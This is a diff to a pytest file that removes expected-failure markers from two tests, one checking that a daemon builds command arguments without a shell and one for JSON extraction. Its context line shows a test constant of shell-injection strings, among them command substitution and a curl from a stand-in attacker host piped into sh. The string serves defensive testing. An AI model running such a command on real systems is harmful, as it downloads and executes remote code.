@@ -27,7 +27,6 @@ HOSTILE = "$(id); `id`; echo pwned > /tmp/x && curl evil.example.org | sh\n'\"\x
 
 @pytest.mark.req("FR-5.11")
 @pytest.mark.wp("P1-04")
-@pytest.mark.xfail(strict=True, reason="spec:P1-04")
 def test_argv_never_uses_shell_and_validates_profile(cfg: DaemonConfig, tmp_path: Path) -> None:
     """T-P1-04-14
     `hermes_argv` for a hostile packet holds no packet text (the prompt goes in a query
@@ -98,7 +97,6 @@ CASES: dict[str, tuple[str, dict[str, object] | None]] = {
 
 @pytest.mark.req("FR-5.11")
 @pytest.mark.wp("P1-04")
-@pytest.mark.xfail(strict=True, reason="spec:P1-04")
 @pytest.mark.parametrize("case", sorted(CASES))
 def test_extract_json_object(case: str) -> None:
     """T-P1-04-15
